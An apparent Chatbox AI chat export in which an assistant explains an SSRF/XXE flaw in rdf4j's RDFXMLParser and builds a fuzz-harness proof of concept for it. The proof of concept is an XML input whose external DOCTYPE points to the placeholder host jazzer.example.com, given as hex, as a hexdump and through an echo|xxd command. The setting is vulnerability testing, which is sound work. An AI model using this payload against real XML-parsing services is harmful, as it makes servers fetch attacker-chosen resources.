
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>POC - Rdf4jOneCPVTwo</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
    <script>
        tailwind.config = {
        }
    </script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
    <link rel="shortcut icon" href="https://chatboxai.app/icon.png">
</head>
<body class='bg-slate-100'>
    <div class='mx-auto max-w-5xl shadow-md prose bg-white px-2 py-4'>
        <h1 class='flex flex-row justify-between items-center my-4 h-8'>
            <span>POC - Rdf4jOneCPVTwo</span>
            <a href="https://chatboxai.app" target="_blank" >
                <img src='https://chatboxai.app/icon.png' class="w-12">
            </a>
        </h1>
        <hr />
        <div class="prose-sm">
<h2>1. POC Hexdump</h2>
<div class="mb-4">
<p class="text-green-500 text-lg"><b>SYSTEM: </b></p>
<div class="break-words "><p>You are a helpful assistant for answering my questions.</p></div></div>
<div class="mb-4">
<p class="text-green-500 text-lg"><b>USER: </b></p>
<div class="break-words "></div></div>
<div class="mb-4">
<p class="text-blue-500 text-lg"><b>ASSISTANT: </b></p>
<div class="break-words "><p>The vulnerability at the sinkpoint (line 328 of <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">RDFXMLParser.java</code>) occurs because the XML parser (<code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">XMLReader</code>) is not properly configured to prevent external entities from being resolved. This means that when the parser encounters an XML input that includes external entity definitions (e.g., DOCTYPE declarations with SYSTEM identifiers), it may attempt to fetch the external resources specified, leading to a Server-Side Request Forgery (SSRF).</p>
<p>In the given code, the parser does not set features to disable external entity processing securely. Specifically, unless <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">XMLParserSettings.LOAD_EXTERNAL_DTD</code> is explicitly disabled, the parser may process external DTDs and entities, potentially causing SSRF when parsing crafted input.</p>
<p>To exploit this vulnerability, we can craft an XML input that includes an external entity or external DTD reference pointing to <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">http://jazzer.example.com</code>. When the parser processes this XML, it will attempt to fetch the external resource, demonstrating the SSRF vulnerability.</p>
<p>Considering the constraints in the <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">Rdf4jOne.java</code> <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">fuzz</code> method:</p>
<ul>
<li>We need to set <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">picker</code> to <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">5</code> to invoke the <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">RDFXMLParser</code>.</li>
<li>We need to provide an <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">XML</code> input in the <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">whole</code> byte array that includes an external entity pointing to <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">http://jazzer.example.com</code>.</li>
</ul>
<p>Here&#x27;s the PoC in hex:</p>
<pre><div><div class="py-0.5 px-1" style="display:flex;justify-content:space-between;width:100%;background-color:rgb(50, 50, 50);font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;border-top-left-radius:0.3rem;border-top-right-radius:0.3rem;border-bottom-left-radius:0;border-bottom-right-radius:0"><div class="flex items-center"><span class="text-gray-400/30 mx-1" style="font-size:1rem">TEXT</span></div><div class="flex items-center"></div></div><div style="position:relative" class="group"><div class=""><div style="color:#f8f8f2;background:#2b2b2b;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em;margin-top:0;border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:0.3rem;border-bottom-right-radius:0.3rem;border:none"><code class="language-text" style="color:#f8f8f2;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>00 00 00 05 00 00 00 01 3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E 30 22 3F 3E 0A 3C 21 44 4F 43 54 59 50 45 20 72 64 66 3A 52 44 46 20 53 59 53 54 45 4D 20 22 68 74 74 70 3A 2F 2F 6A 61 7A 7A 65 72 2E 65 78 61 6D 70 6C 65 2E 63 6F 6D 22 3E 0A 3C 72 64 66 3A 52 44 46 20 78 6D 6C 6E 73 3A 72 64 66 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67 2F 31 39 39 39 2F 30 32 2F 32 32 2D 72 64 66 2D 73 79 6E 74 61 78 2D 6E 73 23 22 3E 0A 3C 2F 72 64 66 3A 52 44 46 3E
</span></code></div></div></div></div></pre>
<p>This corresponds to the following data:</p>
<ul>
<li><strong>Picker (4 bytes)</strong>: <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">00 00 00 05</code> (integer 5)</li>
<li><strong>Count (4 bytes)</strong>: <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">00 00 00 01</code> (integer 1)</li>
<li><strong>XML Content</strong>:
<pre><div><div class="py-0.5 px-1" style="display:flex;justify-content:space-between;width:100%;background-color:rgb(50, 50, 50);font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;border-top-left-radius:0.3rem;border-top-right-radius:0.3rem;border-bottom-left-radius:0;border-bottom-right-radius:0"><div class="flex items-center"><span class="text-gray-400/30 mx-1" style="font-size:1rem">XML</span></div><div class="flex items-center"></div></div><div style="position:relative" class="group"><div class=""><div style="color:#f8f8f2;background:#2b2b2b;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em;margin-top:0;border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:0.3rem;border-bottom-right-radius:0.3rem;border:none"><code class="language-xml" style="color:#f8f8f2;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#d4d0ab">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span>
</span><span></span><span class="token" style="color:#fefefe">&lt;!</span><span class="token doctype-tag" style="color:#d4d0ab">DOCTYPE</span><span class="token" style="color:#d4d0ab"> </span><span class="token name" style="color:#d4d0ab">rdf:RDF</span><span class="token" style="color:#d4d0ab"> </span><span class="token name" style="color:#d4d0ab">SYSTEM</span><span class="token" style="color:#d4d0ab"> </span><span class="token" style="color:#abe338">&quot;http://jazzer.example.com&quot;</span><span class="token" style="color:#fefefe">&gt;</span><span>
</span><span></span><span class="token" style="color:#fefefe">&lt;</span><span class="token namespace" style="color:#ffa07a">rdf:</span><span class="token" style="color:#ffa07a">RDF</span><span class="token" style="color:#ffa07a"> </span><span class="token namespace" style="color:#abe338">xmlns:</span><span class="token" style="color:#abe338">rdf</span><span class="token attr-equals" style="color:#fefefe">=</span><span class="token" style="color:#fefefe">&quot;</span><span class="token" style="color:#ffd700">http://www.w3.org/1999/02/22-rdf-syntax-ns#</span><span class="token" style="color:#fefefe">&quot;</span><span class="token" style="color:#fefefe">&gt;</span><span>
</span><span></span><span class="token" style="color:#fefefe">&lt;/</span><span class="token namespace" style="color:#ffa07a">rdf:</span><span class="token" style="color:#ffa07a">RDF</span><span class="token" style="color:#fefefe">&gt;</span><span>
</span></code></div></div></div></div></pre>
</li>
</ul>
<p>When parsed by <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">RDFXMLParser</code>, this XML input causes the parser to attempt to fetch <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">http://jazzer.example.com</code> due to the external DTD specified in the <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">DOCTYPE</code> declaration. This demonstrates the SSRF vulnerability.</p>
<p><strong>PoC Hex Dump:</strong></p>
<pre><div><div class="py-0.5 px-1" style="display:flex;justify-content:space-between;width:100%;background-color:rgb(50, 50, 50);font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;border-top-left-radius:0.3rem;border-top-right-radius:0.3rem;border-bottom-left-radius:0;border-bottom-right-radius:0"><div class="flex items-center"><span class="text-gray-400/30 mx-1" style="font-size:1rem">TEXT</span></div><div class="flex items-center"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeSmall cursor-pointer text-white opacity-30 hover:bg-gray-800 hover:opacity-100 mx-1 rotate-90 css-1k33q06" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ArrowForwardIosIcon"><path d="M6.23 20.23 8 22l10-10L8 2 6.23 3.77 14.46 12z"></path></svg></div></div><div style="position:relative" class="group"><div class=""><div style="color:#f8f8f2;background:#2b2b2b;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em;margin-top:0;border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:0.3rem;border-bottom-right-radius:0.3rem;border:none"><code class="language-text" style="color:#f8f8f2;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>00000000  00 00 00 05 00 00 00 01 3c 3f 78 6d 6c 20 76 65  |........&lt;?xml ve|
</span>00000010  72 73 69 6f 6e 3d 22 31 2e 30 22 3f 3e 0a 3c 21  |rsion=&quot;1.0&quot;?&gt;.&lt;!|
00000020  44 4f 43 54 59 50 45 20 72 64 66 3a 52 44 46 20  |DOCTYPE rdf:RDF |
00000030  53 59 53 54 45 4d 20 22 68 74 74 70 3a 2f 2f 6a  |SYSTEM &quot;http://j|
00000040  61 7a 7a 65 72 2e 65 78 61 6d 70 6c 65 2e 63 6f  |azzer.example.co|
00000050  6d 22 3e 0a 3c 72 64 66 3a 52 44 46 20 78 6d 6c  |m&quot;&gt;.&lt;rdf:RDF xml|
00000060  6e 73 3a 72 64 66 3d 22 68 74 74 70 3a 2f 2f 77  |ns:rdf=&quot;http://w|
00000070  77 77 2e 77 33 2e 6f 72 67 2f 31 39 39 39 2f 30  |ww.w3.org/1999/0|
00000080  32 2f 32 32 2d 72 64 66 2d 73 79 6e 74 61 78 2d  |2/22-rdf-syntax-|
00000090  6e 73 23 22 3e 0a 3c 2f 72 64 66 3a 52 44 46 3e  |ns#&quot;&gt;.&lt;/rdf:RDF&gt;|
</code></div></div><span class="
                                absolute bottom-0 left-0 right-0 w-12 mx-auto
                                cursor-pointer opacity-0 group-hover:opacity-100 transition-opacity duration-300
                                text-white font-bold bg-slate-600/80 py-0 px-4 rounded-t-md"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeSmall text-white css-1k33q06" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ExpandLessIcon"><path d="m12 8-6 6 1.41 1.41L12 10.83l4.59 4.58L18 14z"></path></svg></span></div></div></pre>
<p>This PoC can be used to demonstrate the SSRF vulnerability in the <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">RDFXMLParser</code> when processing untrusted XML input.</p></div></div>
<div class="mb-4">
<p class="text-green-500 text-lg"><b>USER: </b></p>
<div class="break-words "><p>Transform the final poc hexdump as a hex string, such as &quot;00010203...&quot;, so I can directly copy it, echo it in bash and use xxd to save it as a file.</p></div></div>
<div class="mb-4">
<p class="text-blue-500 text-lg"><b>ASSISTANT: </b></p>
<div class="break-words "><p>Certainly! Here&#x27;s the PoC as a hex string:</p>
<pre><div><div class="py-0.5 px-1" style="display:flex;justify-content:space-between;width:100%;background-color:rgb(50, 50, 50);font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;border-top-left-radius:0.3rem;border-top-right-radius:0.3rem;border-bottom-left-radius:0;border-bottom-right-radius:0"><div class="flex items-center"><span class="text-gray-400/30 mx-1" style="font-size:1rem">TEXT</span></div><div class="flex items-center"></div></div><div style="position:relative" class="group"><div class=""><div style="color:#f8f8f2;background:#2b2b2b;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em;margin-top:0;border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:0.3rem;border-bottom-right-radius:0.3rem;border:none"><code class="language-text" style="color:#f8f8f2;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>00000005000000013c3f786d6c2076657273696f6e3d22312e30223f3e0a3c21444f4354595045207264663a5244462053595354454d2022687474703a2f2f6a617a7a65722e6578616d706c652e636f6d223e0a3c7264663a52444620786d6c6e733a7264663d22687474703a2f2f7777772e77332e6f72672f313939392f30322f32322d7264662d73796e7461782d6e7323223e0a3c2f7264663a5244463e
</span></code></div></div></div></div></pre>
<p>You can use this hex string to create the PoC file. Here&#x27;s how you can do it in a bash terminal:</p>
<ol>
<li>
<p><strong>Copy the hex string</strong> (make sure it is continuous without any spaces or newlines).</p>
</li>
<li>
<p><strong>Use <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">echo</code> and <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">xxd</code> to create the binary file</strong>:</p>
<pre><div><div class="py-0.5 px-1" style="display:flex;justify-content:space-between;width:100%;background-color:rgb(50, 50, 50);font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;border-top-left-radius:0.3rem;border-top-right-radius:0.3rem;border-bottom-left-radius:0;border-bottom-right-radius:0"><div class="flex items-center"><span class="text-gray-400/30 mx-1" style="font-size:1rem">BASH</span></div><div class="flex items-center"></div></div><div style="position:relative" class="group"><div class=""><div style="color:#f8f8f2;background:#2b2b2b;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em;margin-top:0;border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:0.3rem;border-bottom-right-radius:0.3rem;border:none"><code class="language-bash" style="color:#f8f8f2;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token class-name" style="color:#abe338">echo</span><span> -n </span><span class="token" style="color:#abe338">&quot;00000005000000013c3f786d6c2076657273696f6e3d22312e30223f3e0a3c21444f4354595045207264663a5244462053595354454d2022687474703a2f2f6a617a7a65722e6578616d706c652e636f6d223e0a3c7264663a52444620786d6c6e733a7264663d22687474703a2f2f7777772e77332e6f72672f313939392f30322f32322d7264662d73796e7461782d6e7323223e0a3c2f7264663a5244463e&quot;</span><span> </span><span class="token" style="color:#00e0e0">|</span><span> xxd -r -p </span><span class="token" style="color:#00e0e0">&gt;</span><span> poc.bin
</span></code></div></div></div></div></pre>
<p>This command does the following:</p>
<ul>
<li><code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">echo -n &quot;...&quot;</code> outputs the hex string without a trailing newline.</li>
<li><code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">| xxd -r -p</code> pipes the hex string into <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">xxd</code>, which converts it from hex to binary.</li>
<li><code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">&gt; poc.bin</code> redirects the binary output to a file named <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">poc.bin</code>.</li>
</ul>
</li>
<li>
<p><strong>Verify the contents</strong> (optional):</p>
<p>To ensure the file has been created correctly, you can use <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">hexdump</code> or <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">xxd</code> to inspect it:</p>
<pre><div><div class="py-0.5 px-1" style="display:flex;justify-content:space-between;width:100%;background-color:rgb(50, 50, 50);font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;border-top-left-radius:0.3rem;border-top-right-radius:0.3rem;border-bottom-left-radius:0;border-bottom-right-radius:0"><div class="flex items-center"><span class="text-gray-400/30 mx-1" style="font-size:1rem">BASH</span></div><div class="flex items-center"></div></div><div style="position:relative" class="group"><div class=""><div style="color:#f8f8f2;background:#2b2b2b;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em;margin-top:0;border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:0.3rem;border-bottom-right-radius:0.3rem;border:none"><code class="language-bash" style="color:#f8f8f2;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>xxd poc.bin
</span></code></div></div></div></div></pre>
<p>The output should look like this:</p>
<pre><div><div class="py-0.5 px-1" style="display:flex;justify-content:space-between;width:100%;background-color:rgb(50, 50, 50);font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;border-top-left-radius:0.3rem;border-top-right-radius:0.3rem;border-bottom-left-radius:0;border-bottom-right-radius:0"><div class="flex items-center"><span class="text-gray-400/30 mx-1" style="font-size:1rem">TEXT</span></div><div class="flex items-center"></div></div><div style="position:relative" class="group"><div class=""><div style="color:#f8f8f2;background:#2b2b2b;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em;margin-top:0;border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:0.3rem;border-bottom-right-radius:0.3rem;border:none"><code class="language-text" style="color:#f8f8f2;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>00000000: 0000 0005 0000 0001 3c3f 786d 6c20 7665  ........&lt;?xml ve
</span>00000010: 7273 696f 6e3d 2231 2e30 223f 3e0a 3c21  rsion=&quot;1.0&quot;?&gt;.&lt;!
00000020: 444f 4354 5950 4520 7264 663a 5244 4620  DOCTYPE rdf:RDF 
00000030: 5359 5354 454d 2022 6874 7470 3a2f 2f6a  SYSTEM &quot;http://j
00000040: 617a 7a65 722e 6578 616d 706c 652e 636f  azzer.example.co
00000050: 6d22 3e0a 3c72 6466 3a52 4446 2078 6d6c  m&quot;&gt;.&lt;rdf:RDF xml
00000060: 6e73 3a72 6466 3d22 6874 7470 3a2f 2f77  ns:rdf=&quot;http://w
00000070: 7777 2e77 332e 6f72 672f 3139 3939 2f30  ww.w3.org/1999/0
00000080: 322f 3232 2d72 6466 2d73 796e 7461 782d  2/22-rdf-syntax-
00000090: 6e73 2322 3e0a 3c2f 7264 663a 5244 463e  ns#&quot;&gt;.&lt;/rdf:RDF&gt;
</code></div></div></div></div></pre>
</li>
</ol>
<p><strong>Explanation of the Hex String:</strong></p>
<ul>
<li><strong>Bytes 0-3 (<code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">00 00 00 05</code>)</strong>: The <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">picker</code>, set to integer <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">5</code>, to select the <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">RDFXMLParser</code>.</li>
<li><strong>Bytes 4-7 (<code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">00 00 00 01</code>)</strong>: The <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">count</code>, set to integer <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">1</code>.</li>
<li><strong>Bytes 8 onwards</strong>: The XML content in bytes. This XML includes an external <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">DOCTYPE</code> declaration that references <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">http://jazzer.example.com</code>, which is used to demonstrate the SSRF vulnerability.</li>
</ul>
<p><strong>XML Content Represented by the Hex String:</strong></p>
<pre><div><div class="py-0.5 px-1" style="display:flex;justify-content:space-between;width:100%;background-color:rgb(50, 50, 50);font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;border-top-left-radius:0.3rem;border-top-right-radius:0.3rem;border-bottom-left-radius:0;border-bottom-right-radius:0"><div class="flex items-center"><span class="text-gray-400/30 mx-1" style="font-size:1rem">XML</span></div><div class="flex items-center"></div></div><div style="position:relative" class="group"><div class=""><div style="color:#f8f8f2;background:#2b2b2b;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em;margin-top:0;border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:0.3rem;border-bottom-right-radius:0.3rem;border:none"><code class="language-xml" style="color:#f8f8f2;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#d4d0ab">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span>
</span><span></span><span class="token" style="color:#fefefe">&lt;!</span><span class="token doctype-tag" style="color:#d4d0ab">DOCTYPE</span><span class="token" style="color:#d4d0ab"> </span><span class="token name" style="color:#d4d0ab">rdf:RDF</span><span class="token" style="color:#d4d0ab"> </span><span class="token name" style="color:#d4d0ab">SYSTEM</span><span class="token" style="color:#d4d0ab"> </span><span class="token" style="color:#abe338">&quot;http://jazzer.example.com&quot;</span><span class="token" style="color:#fefefe">&gt;</span><span>
</span><span></span><span class="token" style="color:#fefefe">&lt;</span><span class="token namespace" style="color:#ffa07a">rdf:</span><span class="token" style="color:#ffa07a">RDF</span><span class="token" style="color:#ffa07a"> </span><span class="token namespace" style="color:#abe338">xmlns:</span><span class="token" style="color:#abe338">rdf</span><span class="token attr-equals" style="color:#fefefe">=</span><span class="token" style="color:#fefefe">&quot;</span><span class="token" style="color:#ffd700">http://www.w3.org/1999/02/22-rdf-syntax-ns#</span><span class="token" style="color:#fefefe">&quot;</span><span class="token" style="color:#fefefe">&gt;</span><span>
</span><span></span><span class="token" style="color:#fefefe">&lt;/</span><span class="token namespace" style="color:#ffa07a">rdf:</span><span class="token" style="color:#ffa07a">RDF</span><span class="token" style="color:#fefefe">&gt;</span><span>
</span></code></div></div></div></div></pre>
<p>When processed by the <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">RDFXMLParser</code>, this XML input causes the parser to attempt to fetch the external DTD from <code style="background-color:#f1f1f1;padding:2px 4px;margin:0 4px;border-radius:4px;border:1px solid;border-color:#ddd">http://jazzer.example.com</code>, demonstrating the SSRF vulnerability.</p>
<p><strong>Note:</strong> Be cautious when handling and testing this PoC. Ensure that you&#x27;re performing tests in a safe and controlled environment to prevent unintended network requests or security issues.</p></div></div>
<hr />
</div>

        <hr />
        <a href="https://chatboxai.app" style="display: flex; align-items: center;" class="text-sky-500" target="_blank">
            <img src='https://chatboxai.app/icon.png' class="w-12 pr-2">
            <b style='font-size:30px'>Chatbox AI</b>
        </a>
        <p><a a href="https://chatboxai.app" target="_blank">https://chatboxai.app</a></p>
    </div>
</body>
</html>
